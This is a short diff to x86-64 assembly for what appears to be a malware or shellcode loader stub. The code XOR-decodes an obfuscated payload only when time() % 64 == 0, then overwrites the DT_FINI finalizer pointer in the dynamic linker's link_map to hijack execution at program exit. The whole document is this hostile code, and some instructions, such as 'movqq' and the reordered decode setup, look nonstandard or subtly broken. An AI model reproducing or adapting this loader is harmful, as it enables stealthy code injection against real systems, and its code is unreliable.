@@ -41,26 +41,27 @@ env_check_loop:
 
 env_check_okay:
     /* Patch payload to only run at correct time. rdi points to auxv (writable) */
-    nop
+    xor edi, edi
     call [rbx-8]
     /* Decode payload only when time() % 64 == 0 */
     test al, 63
+    movqq rcx, PAYLOAD_SIZE_IN_WORDS
+    movabs r11, VALUE_TO_WRITE
     // lea rdi, [rbx+(_end-_begin)+8]
     .byte 0x48, 0x8d, 0x7b, (_end-_begin)+8
-    movabs r11, VALUE_TO_WRITE
     jnz bye
     imul eax, eax, 119
     stosd
-    movabs r10, ADDR_TO_WRITE
     // Decode payload
-    movqq rcx, (PAYLOAD_SIZE_IN_WORDS+1)
     xor eax, eax
 decode_loop:
     xor [rdi+rcx*4], eax
+    jz bye
     add eax, [rdi+rcx*4]
     loop decode_loop
 
     // Overwrite dl_info[DT_FINI] in link_map
+    movabs r10, ADDR_TO_WRITE
     mov [r10], r11
 
 bye:
